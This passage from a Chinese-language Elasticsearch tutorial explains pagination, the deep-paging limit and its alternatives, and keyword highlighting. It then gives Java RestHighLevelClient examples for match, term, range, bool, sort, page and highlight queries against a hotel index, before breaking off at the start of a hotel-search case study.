id="2-2-1-基本的分页"><a href="#2-2-1-基本的分页" class="headerlink" title="2.2.1.基本的分页"></a>2.2.1.基本的分页</h3><p>分页的基本语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;from&quot;</span>: <span class="number">0</span>, <span class="comment">// 分页开始的位置，默认为0</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span>: <span class="number">10</span>, <span class="comment">// 期望获取的文档总数</span></span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;<span class="attr">&quot;price&quot;</span>: <span class="string">&quot;asc&quot;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="pacqf"></a></p><h3 id="2-2-2-深度分页问题"><a href="#2-2-2-深度分页问题" class="headerlink" title="2.2.2.深度分页问题"></a>2.2.2.深度分页问题</h3><p>现在，我要查询990~1000的数据，查询逻辑要这么写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;from&quot;</span>: <span class="number">990</span>, <span class="comment">// 分页开始的位置，默认为0</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span>: <span class="number">10</span>, <span class="comment">// 期望获取的文档总数</span></span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;<span class="attr">&quot;price&quot;</span>: <span class="string">&quot;asc&quot;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是查询990开始的数据，也就是 第990<del>第1000条 数据。<br />不过，elasticsearch内部分页时，必须先查询 0</del>1000条，然后截取其中的990 ~ 1000的这10条：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492964-71c4dce9-8c55-45e9-a212-197347ea1e1d.png#crop=0&crop=0&crop=1&crop=1&id=hgCFJ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />查询TOP1000，如果es是单点模式，这并无太大影响。<br />但是elasticsearch将来一定是集群，例如我集群有5个节点，我要查询TOP1000的数据，并不是每个节点查询200条就可以了。<br />因为节点A的TOP200，在另一个节点可能排到10000名以外了。<br />因此要想获取整个集群的TOP1000，必须先查询出每个节点的TOP1000，汇总结果后，重新排名，重新截取TOP1000。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493047-7c110509-bf9d-49ae-ad1b-7213cd91e371.png#crop=0&crop=0&crop=1&crop=1&id=EJsoD&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />那如果我要查询9900~10000的数据呢？是不是要先查询TOP10000呢？那每个节点都要查询10000条？汇总到内存中？<br />当查询分页深度较大时，汇总数据过多，对内存和CPU会产生非常大的压力，因此elasticsearch会禁止from+ size 超过10000的请求。<br />针对深度分页，ES提供了两种解决方案，<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_paginate-search-results/">官方文档</a>：</p><ul><li><p>search after：分页时需要排序，原理是从上一次的排序值开始，查询下一页数据。官方推荐使用的方式。</p></li><li><p>scroll：原理将排序后的文档id形成快照，保存在内存。官方已经不推荐使用。<br><a name="uFEyF"></a></p><h3 id="2-2-3-小结"><a href="#2-2-3-小结" class="headerlink" title="2.2.3.小结"></a>2.2.3.小结</h3><p>分页查询的常见实现方案以及优缺点：</p></li><li><p><code>from + size</code>：</p><ul><li>优点：支持随机翻页</li><li>缺点：深度分页问题，默认查询上限（from + size）是10000</li><li>场景：百度、京东、谷歌、淘宝这样的随机翻页搜索</li></ul></li><li><p><code>after search</code>：</p><ul><li>优点：没有查询上限（单次查询的size不超过10000）</li><li>缺点：只能向后逐页查询，不支持随机翻页</li><li>场景：没有随机翻页需求的搜索，例如手机向下滚动翻页</li></ul></li><li><p><code>scroll</code>：</p><ul><li>优点：没有查询上限（单次查询的size不超过10000）</li><li>缺点：会有额外内存消耗，并且搜索结果是非实时的</li><li>场景：海量数据的获取和迁移。从ES7.1开始不推荐，建议用 after search方案。<br><a name="c4vBF"></a><h2 id="2-3-高亮"><a href="#2-3-高亮" class="headerlink" title="2.3.高亮"></a>2.3.高亮</h2><a name="AoJ4q"></a><h3 id="2-3-1-高亮原理"><a href="#2-3-1-高亮原理" class="headerlink" title="2.3.1.高亮原理"></a>2.3.1.高亮原理</h3>什么是高亮显示呢？<br />我们在百度，京东搜索时，关键字会变成红色，比较醒目，这叫高亮显示：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493133-cfbc56a0-3f3c-4ac4-a944-4a9a9fff6ae2.png#crop=0&crop=0&crop=1&crop=1&id=wvmDs&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />高亮显示的实现分为两步：</li></ul></li><li><p>1）给文档中的所有关键字都添加一个标签，例如<code>&lt;em&gt;</code>标签</p></li><li><p>2）页面给<code>&lt;em&gt;</code>标签编写CSS样式<br><a name="DdXpw"></a></p><h3 id="2-3-2-实现高亮"><a href="#2-3-2-实现高亮" class="headerlink" title="2.3.2.实现高亮"></a>2.3.2.实现高亮</h3></li></ul><p><strong>高亮的语法</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;TEXT&quot;</span> <span class="comment">// 查询条件，高亮一定要使用全文检索查询</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;highlight&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;fields&quot;</span>: &#123; <span class="comment">// 指定要高亮的字段</span></span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;pre_tags&quot;</span>: <span class="string">&quot;&lt;em&gt;&quot;</span>,  <span class="comment">// 用来标记高亮字段的前置标签</span></span><br><span class="line">        <span class="attr">&quot;post_tags&quot;</span>: <span class="string">&quot;&lt;/em&gt;&quot;</span> <span class="comment">// 用来标记高亮字段的后置标签</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>高亮是对关键字高亮，因此<strong>搜索条件必须带有关键字</strong>，而不能是范围这样的查询。</li><li>默认情况下，<strong>高亮的字段，必须与搜索指定的字段一致</strong>，否则无法高亮</li><li>如果要对非搜索字段高亮，则需要添加一个属性：required_field_match=false</li></ul><p><strong>示例</strong>：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493238-db0da126-e3de-4e7a-92a8-c32833e20160.png#crop=0&crop=0&crop=1&crop=1&id=B54no&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="bFCA7"></a></p><h2 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4.总结"></a>2.4.总结</h2><p>查询的DSL是一个大的JSON对象，包含下列属性：</p><ul><li>query：查询条件</li><li>from和size：分页条件</li><li>sort：排序条件</li><li>highlight：高亮条件</li></ul><p>示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493354-9794652a-3b39-4e01-a152-eb99436247fb.png#crop=0&crop=0&crop=1&crop=1&id=LqpcM&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Gcds8"></a></p><h1 id="3-RestClient查询文档"><a href="#3-RestClient查询文档" class="headerlink" title="3.RestClient查询文档"></a>3.RestClient查询文档</h1><p>文档的查询同样适用昨天学习的 RestHighLevelClient对象，基本步骤包括：</p><ul><li><p>1）准备Request对象</p></li><li><p>2）准备请求参数</p></li><li><p>3）发起请求</p></li><li><p>4）解析响应<br><a name="Q86qC"></a></p><h2 id="3-1-快速入门"><a href="#3-1-快速入门" class="headerlink" title="3.1.快速入门"></a>3.1.快速入门</h2><p>我们以match_all查询为例<br><a name="kfL1y"></a></p><h3 id="3-1-1-发起查询请求"><a href="#3-1-1-发起查询请求" class="headerlink" title="3.1.1.发起查询请求"></a>3.1.1.发起查询请求</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493440-cf56f498-34d3-4e4a-b700-932289b4139d.png#crop=0&crop=0&crop=1&crop=1&id=PcXeM&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />代码解读：</p></li><li><p>第一步，创建<code>SearchRequest</code>对象，指定索引库名</p></li><li><p>第二步，利用<code>request.source()</code>构建DSL，DSL中可以包含查询、分页、排序、高亮等</p><ul><li><code>query()</code>：代表查询条件，利用<code>QueryBuilders.matchAllQuery()</code>构建一个match_all查询的DSL</li></ul></li><li><p>第三步，利用client.search()发送请求，得到响应</p></li></ul><p>这里关键的API有两个，一个是<code>request.source()</code>，其中包含了查询、排序、分页、高亮等所有功能：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493525-bd78e7f4-cb40-484e-8d27-e427bf92d82f.png#crop=0&crop=0&crop=1&crop=1&id=hyoqn&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />另一个是<code>QueryBuilders</code>，其中包含match、term、function_score、bool等各种查询：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493628-5a0dc86a-057d-4d63-a7ef-066a92c33a12.png#crop=0&crop=0&crop=1&crop=1&id=pWnaH&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="lnXTZ"></a></p><h3 id="3-1-2-解析响应"><a href="#3-1-2-解析响应" class="headerlink" title="3.1.2.解析响应"></a>3.1.2.解析响应</h3><p>响应结果的解析：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493732-1de1fd56-86bc-4274-8068-c0a9ace82388.png#crop=0&crop=0&crop=1&crop=1&id=P5XJT&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />elasticsearch返回的结果是一个JSON字符串，结构包含：</p><ul><li><code>hits</code>：命中的结果<ul><li><code>total</code>：总条数，其中的value是具体的总条数值</li><li><code>max_score</code>：所有结果中得分最高的文档的相关性算分</li><li><code>hits</code>：搜索结果的文档数组，其中的每个文档都是一个json对象<ul><li><code>_source</code>：文档中的原始数据，也是json对象</li></ul></li></ul></li></ul><p>因此，我们解析响应结果，就是逐层解析JSON字符串，流程如下：</p><ul><li><code>SearchHits</code>：通过response.getHits()获取，就是JSON中的最外层的hits，代表命中的结果<ul><li><code>SearchHits#getTotalHits().value</code>：获取总条数信息</li><li><code>SearchHits#getHits()</code>：获取SearchHit数组，也就是文档数组<ul><li><code>SearchHit#getSourceAsString()</code>：获取文档结果中的_source，也就是原始的json文档数据<br><a name="fUDpm"></a><h3 id="3-1-3-完整代码"><a href="#3-1-3-完整代码" class="headerlink" title="3.1.3.完整代码"></a>3.1.3.完整代码</h3>完整代码如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testMatchAll</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    request.source()</span><br><span class="line">        .query(QueryBuilders.matchAllQuery());</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleResponse</span><span class="params">(SearchResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    SearchHits searchHits = response.getHits();</span><br><span class="line">    <span class="comment">// 4.1.获取总条数</span></span><br><span class="line">    <span class="keyword">long</span> total = searchHits.getTotalHits().value;</span><br><span class="line">    System.out.println(<span class="string">&quot;共搜索到&quot;</span> + total + <span class="string">&quot;条数据&quot;</span>);</span><br><span class="line">    <span class="comment">// 4.2.文档数组</span></span><br><span class="line">    SearchHit[] hits = searchHits.getHits();</span><br><span class="line">    <span class="comment">// 4.3.遍历</span></span><br><span class="line">    <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">        <span class="comment">// 获取文档source</span></span><br><span class="line">        String json = hit.getSourceAsString();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        HotelDoc hotelDoc = JSON.parseObject(json, HotelDoc.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;hotelDoc = &quot;</span> + hotelDoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="Hojaa"></a><h3 id="3-1-4-小结"><a href="#3-1-4-小结" class="headerlink" title="3.1.4.小结"></a>3.1.4.小结</h3>查询的基本步骤是：</li></ul></li></ul></li></ul><ol><li>创建SearchRequest对象</li><li>准备Request.source()，也就是DSL。<br />① QueryBuilders来构建查询条件<br />② 传入Request.source() 的 query() 方法</li><li>发送请求，得到结果</li><li>解析结果（参考JSON结果，从外到内，逐层解析）<br><a name="d21au"></a><h2 id="3-2-match查询"><a href="#3-2-match查询" class="headerlink" title="3.2.match查询"></a>3.2.match查询</h2>全文检索的match和multi_match查询与match_all的API基本一致。差别是查询条件，也就是query的部分。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493834-27e3a085-dd03-46db-ac9e-93d5704d262e.png#crop=0&crop=0&crop=1&crop=1&id=YPdY7&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />因此，Java代码上的差异主要是request.source().query()中的参数了。同样是利用QueryBuilders提供的方法：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493916-d328ce68-ae46-4d4e-9d3b-9e33f49d94c5.png#crop=0&crop=0&crop=1&crop=1&id=cxC8D&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />而结果解析代码则完全一致，可以抽取并共享。<br />完整代码如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testMatch</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    request.source()</span><br><span class="line">        .query(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;如家&quot;</span>));</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="SJxZ6"></a><h2 id="3-3-精确查询"><a href="#3-3-精确查询" class="headerlink" title="3.3.精确查询"></a>3.3.精确查询</h2>精确查询主要是两者：</li></ol><ul><li>term：词条精确匹配</li><li>range：范围查询</li></ul><p>与之前的查询相比，差异同样在查询条件，其它都一样。<br />查询条件构造的API如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493997-e01c8096-099d-4628-a5b4-5aac85f61072.png#crop=0&crop=0&crop=1&crop=1&id=NLajm&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="e3ZiE"></a></p><h2 id="3-4-布尔查询"><a href="#3-4-布尔查询" class="headerlink" title="3.4.布尔查询"></a>3.4.布尔查询</h2><p>布尔查询是用must、must_not、filter等方式组合其它查询，代码示例如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494072-0e6e90bd-140a-4a67-af22-57b4cd008974.png#crop=0&crop=0&crop=1&crop=1&id=X877l&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，API与其它查询的差别同样是在查询条件的构建，QueryBuilders，结果解析等其他代码完全不变。<br />完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testBool</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    <span class="comment">// 2.1.准备BooleanQuery</span></span><br><span class="line">    BoolQueryBuilder boolQuery = QueryBuilders.boolQuery();</span><br><span class="line">    <span class="comment">// 2.2.添加term</span></span><br><span class="line">    boolQuery.must(QueryBuilders.termQuery(<span class="string">&quot;city&quot;</span>, <span class="string">&quot;杭州&quot;</span>));</span><br><span class="line">    <span class="comment">// 2.3.添加range</span></span><br><span class="line">    boolQuery.filter(QueryBuilders.rangeQuery(<span class="string">&quot;price&quot;</span>).lte(<span class="number">250</span>));</span><br><span class="line">    request.source().query(boolQuery);</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="dcZ6O"></a></p><h2 id="3-5-排序、分页"><a href="#3-5-排序、分页" class="headerlink" title="3.5.排序、分页"></a>3.5.排序、分页</h2><p>搜索结果的排序和分页是与query同级的参数，因此同样是使用request.source()来设置。<br />对应的API如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494155-d6440e41-b65d-49c9-8e0a-b7eccd1dade4.png#crop=0&crop=0&crop=1&crop=1&id=u5LXJ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />完整代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testPageAndSort</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 页码，每页大小</span></span><br><span class="line">    <span class="keyword">int</span> page = <span class="number">1</span>, size = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    <span class="comment">// 2.1.query</span></span><br><span class="line">    request.source().query(QueryBuilders.matchAllQuery());</span><br><span class="line">    <span class="comment">// 2.2.排序 sort</span></span><br><span class="line">    request.source().sort(<span class="string">&quot;price&quot;</span>, SortOrder.ASC);</span><br><span class="line">    <span class="comment">// 2.3.分页 from、size</span></span><br><span class="line">    request.source().from((page - <span class="number">1</span>) * size).size(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="zdHBB"></a></p><h2 id="3-6-高亮"><a href="#3-6-高亮" class="headerlink" title="3.6.高亮"></a>3.6.高亮</h2><p>高亮的代码与之前代码差异较大，有两点：</p><ul><li><p>查询的DSL：其中除了查询条件，还需要添加高亮条件，同样是与query同级。</p></li><li><p>结果解析：结果除了要解析_source文档数据，还要解析高亮结果<br><a name="h16Js"></a></p><h3 id="3-6-1-高亮请求构建"><a href="#3-6-1-高亮请求构建" class="headerlink" title="3.6.1.高亮请求构建"></a>3.6.1.高亮请求构建</h3><p>高亮请求的构建API如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494243-d059b656-6c1c-475e-9cbb-40f244307091.png#crop=0&crop=0&crop=1&crop=1&id=T8Ayb&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />上述代码省略了查询条件部分，但是大家不要忘了：高亮查询必须使用全文检索查询，并且要有搜索关键字，将来才可以对关键字高亮。<br />完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testHighlight</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    <span class="comment">// 2.1.query</span></span><br><span class="line">    request.source().query(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;如家&quot;</span>));</span><br><span class="line">    <span class="comment">// 2.2.高亮</span></span><br><span class="line">    request.source().highlighter(<span class="keyword">new</span> HighlightBuilder().field(<span class="string">&quot;name&quot;</span>).requireFieldMatch(<span class="keyword">false</span>));</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="hRaMJ"></a></p><h3 id="3-6-2-高亮结果解析"><a href="#3-6-2-高亮结果解析" class="headerlink" title="3.6.2.高亮结果解析"></a>3.6.2.高亮结果解析</h3><p>高亮的结果与查询的文档结果默认是分离的，并不在一起。<br />因此解析高亮的代码需要额外处理：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494319-f91bae56-d104-4696-8278-a418817409f9.png#crop=0&crop=0&crop=1&crop=1&id=Vq85f&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />代码解读：</p></li><li><p>第一步：从结果中获取source。hit.getSourceAsString()，这部分是非高亮结果，json字符串。还需要反序列为HotelDoc对象</p></li><li><p>第二步：获取高亮结果。hit.getHighlightFields()，返回值是一个Map，key是高亮字段名称，值是HighlightField对象，代表高亮值</p></li><li><p>第三步：从map中根据高亮字段名称，获取高亮字段值对象HighlightField</p></li><li><p>第四步：从HighlightField中获取Fragments，并且转为字符串。这部分就是真正的高亮字符串了</p></li><li><p>第五步：用高亮的结果替换HotelDoc中的非高亮结果</p></li></ul><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleResponse</span><span class="params">(SearchResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    SearchHits searchHits = response.getHits();</span><br><span class="line">    <span class="comment">// 4.1.获取总条数</span></span><br><span class="line">    <span class="keyword">long</span> total = searchHits.getTotalHits().value;</span><br><span class="line">    System.out.println(<span class="string">&quot;共搜索到&quot;</span> + total + <span class="string">&quot;条数据&quot;</span>);</span><br><span class="line">    <span class="comment">// 4.2.文档数组</span></span><br><span class="line">    SearchHit[] hits = searchHits.getHits();</span><br><span class="line">    <span class="comment">// 4.3.遍历</span></span><br><span class="line">    <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">        <span class="comment">// 获取文档source</span></span><br><span class="line">        String json = hit.getSourceAsString();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        HotelDoc hotelDoc = JSON.parseObject(json, HotelDoc.class);</span><br><span class="line">        <span class="comment">// 获取高亮结果</span></span><br><span class="line">        Map&lt;String, HighlightField&gt; highlightFields = hit.getHighlightFields();</span><br><span class="line">        <span class="keyword">if</span> (!CollectionUtils.isEmpty(highlightFields)) &#123;</span><br><span class="line">            <span class="comment">// 根据字段名获取高亮结果</span></span><br><span class="line">            HighlightField highlightField = highlightFields.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (highlightField != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取高亮值</span></span><br><span class="line">                String name = highlightField.getFragments()[<span class="number">0</span>].string();</span><br><span class="line">                <span class="comment">// 覆盖非高亮结果</span></span><br><span class="line">                hotelDoc.setName(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;hotelDoc = &quot;</span> + hotelDoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="kia2F"></a></p><h1 id="4-黑马旅游案例"><a href="#4-黑马旅游案例" class="headerlink" title="4.黑马旅游案例"></a>4.黑马旅游案例</h1><p>下面，我们通过黑马旅游的案例来实战演练下之前学习的知识。<br />我们实现四部分功能：</p><ul><li>酒店搜索和分页</li><li>酒店结果过滤</li><li>我周边的酒店</li><li>酒店竞价排名</li></ul><p>启动我们提供的hotel-demo项目，其默认端口是8089，访问<a 